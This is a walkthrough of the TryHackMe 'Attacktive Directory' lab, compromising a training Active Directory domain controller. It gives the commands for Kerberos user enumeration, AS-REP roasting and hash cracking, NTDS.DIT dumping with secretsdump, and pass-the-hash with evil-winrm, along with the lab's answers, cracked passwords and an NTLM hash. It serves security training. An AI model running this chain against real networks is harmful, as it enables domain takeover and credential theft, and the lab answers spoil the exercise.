# [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)

## 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?

# Welcome to Attacktive Directory

### What tool will allow us to enumerate port 139/445?

_Try using enum4linux_

1. The answer is: `enum4linux`

```bash
enum4linux IP
```

---

### What is the NetBIOS-Domain Name of the machine?

1. The answer is: `THM-AD`

![SCREEN01](https://github.com/user-attachments/assets/2445c332-9f08-4487-8105-206314c7be69)

---

### What invalid TLD do people commonly use for their Active Directory Domain?

_Spoiler: The full AD domain is spookysec.local_

1. The answer is: `.local`

---

# Enumerating Users via Kerberos

### What command within Kerbrute will allow us to enumerate valid usernames?

_./kerbrute -h may help you_

1. The answer is: `userenum`

```bash
kerbrute -h
```

![SCREEN02](https://github.com/user-attachments/assets/42e27dee-33e8-45df-9236-0331564384ad)

---

### What notable account is discovered? (These should jump out at you)

1. The answer is: `svc-admin`

```bash
kerbrute userenum -d spookysec.local --dc IP userlist.txt
```

![SCREEN03](https://github.com/user-attachments/assets/649f435f-c91c-46dc-bff9-591d60bb6ac4)

---

### What is the other notable account is discovered? (These should jump out at you)

1. The answer is: `backup`

---

# Abusing Kerberos

### We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?

1. The answer is: `svc-admin`

```bash
python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -usersfile userlist.txt -dc-ip IP -no-pass | grep -v "KDC_ERR"
```

![SCREEN04](https://github.com/user-attachments/assets/80209966-baee-4197-8e5b-c05ea81f6813)

---

### Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)

### What mode is the hash?

_https://hashcat.net/wiki/doku.php?id=example_hashes and searching for the first part will help!_

1. The answers are: `Kerberos 5 AS-REP etype 23`, and `18200`

![SCREEN05](https://github.com/user-attachments/assets/32339287-dc5b-465f-b30a-9dd0e30ff807)

---

### Now crack the hash with the modified password list provided, what is the user accounts password?

1. The answer is: `management2005`

```bash
hashcat -m 18200 -a 0 hash passwordlist.txt
```

![SCREEN06](https://github.com/user-attachments/assets/6ae22c2d-8698-4205-8e44-397bf6c6f767)

---

# Back to the Basics

### What utility can we use to map remote SMB shares?

_man smbclient will tell you a little bit about the tool!_

1. The answer is: `smbclient`

---

### Which option will list shares?

_man smbclient will tell you a little bit about the tool!_

1. The answer is: `-L`

![SCREEN07](https://github.com/user-attachments/assets/5bd76672-309d-4b16-831a-7c89bfd420c2)

---

### How many remote shares is the server listing?

1. The answer is: `6`

```bash
smbclient -L //IP -U svc-admin
```

![SCREEN08](https://github.com/user-attachments/assets/9ccec722-174d-48e3-ad62-1b904e7643df)

---

### There is one particular share that we have access to that contains a text file. Which share is it?

### What is the content of the file?

1. The answers are: `backup`, and `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`

```bash
smbclient //IP/backup -U svc-admin
ls
mget *
```

![SCREEN09](https://github.com/user-attachments/assets/14c5d778-a682-46b8-aaec-bbdfe08f642b)

---

### Decoding the contents of the file, what is the full contents?

1. Decode the string from Base64 in [CyberChef](https://gchq.github.io/CyberChef/) to get `backup@spookysec.local:backup2517860`

![SCREEN10](https://github.com/user-attachments/assets/0c379e1e-7030-49c3-a6a0-ada734c6da2e)

---

# Elevating Privileges within the Domain

### What method allowed us to dump NTDS.DIT?

### What is the Administrators NTLM hash?

_Read the secretsdump output!_

1. The answers are: `DRSUAPI`, and `0e0363213e37b94221497260b0bcb4fc`

```bash
python3.9 /opt/impacket/examples/secretsdump.py -just-dc spookysec.local/backup:backup2517860@IP
```

![SCREEN11](https://github.com/user-attachments/assets/d4807bf1-3dbf-4291-ae82-4f9191f81fbe)

---

### What method of attack could allow us to authenticate as the user without the password?

1. The answer is: `Pass The Hash`

---

### Using a tool called Evil-WinRM what option will allow us to use a hash?

_if Evil-WinRM is not installed, you can do so by issuing "gem install evil-winrm"_

1. The answer is: `-H`

```bash
evil-winrm
```

![SCREEN12](https://github.com/user-attachments/assets/70657ab3-b3cb-455f-8a9e-a45da178b302)

# Flag Submission Panel

### svc-admin

```bash
xfreerdp /u:svc-admin /p:management2005 /v:IP
```

![SCREEN13](https://github.com/user-attachments/assets/036d510d-bf88-4e41-89d9-850ece7a4226)

---

### backup

```bash
xfreerdp /u:backup /p:backup2517860 /v:IP
```

![SCREEN14](https://github.com/user-attachments/assets/b84f2d3f-02db-4480-866f-6b7756066353)

### Administrator

```bash
evil-winrm -i IP -u administrator -H 0e0363213e37b94221497260b0bcb4fc
cd ../Desktop
more root.txt
```

![SCREEN15](https://github.com/user-attachments/assets/348108d9-6967-4a08-be16-bd42eccf81a6)
